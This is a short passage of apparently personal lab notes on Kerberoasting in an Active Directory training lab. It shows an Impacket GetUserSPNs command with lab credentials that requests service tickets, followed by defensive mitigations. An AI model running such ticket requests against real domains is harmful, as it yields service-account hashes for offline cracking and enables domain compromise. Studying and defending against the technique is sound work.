___

![](assets/-20251114-16.png)


```
GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.15.18 -request
```

![](assets/-20251114-15.png)

## Mitigations

- Service Account (SQL) does not require to be running as the Domain Admin
- Do not store the service account password in the description of your Active Directory account
- Strong Passwords
- Least privileges

